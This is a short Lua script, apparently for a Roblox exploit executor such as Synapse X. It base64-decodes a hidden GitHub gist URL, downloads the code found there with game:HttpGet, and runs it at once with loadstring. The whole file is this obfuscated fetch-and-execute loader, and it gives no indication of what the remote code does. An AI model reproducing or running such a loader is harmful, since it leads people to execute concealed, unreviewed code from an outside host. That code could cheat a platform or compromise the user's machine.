local str = "aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vR2hvc3REdWNreXkvZmJjNjM4NmY1ODI3YjllZGZjMDUxM2Y1ZTUwNWQ1ZWUvcmF3"
local url = syn and syn.crypt.base64.decode(str) or base64_decode(str)
loadstring(game:HttpGet(url,true))()